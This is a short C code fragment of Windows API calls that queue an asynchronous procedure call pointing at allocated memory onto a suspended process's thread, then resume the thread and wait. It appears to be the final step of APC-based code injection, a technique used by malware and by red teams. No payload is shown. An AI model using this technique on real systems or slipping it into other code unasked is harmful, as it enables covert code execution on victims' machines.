QueueUserAPC(
	(PAPCFUNC)addressPointer, // APC function pointer to allocated memory defined by winnt
	pinfo.hThread, // Handle to thread from PROCESS_INFORMATION structure
	(ULONG_PTR)NULL
	);
ResumeThread(
	pinfo.hThread // Handle to thread from PROCESS_INFORMATION structure
);
WaitForSingleObject(
	pinfo.hThread, // Handle to thread from PROCESS_INFORMATION structure
	INFINITE // Wait infinitely until alerted
);
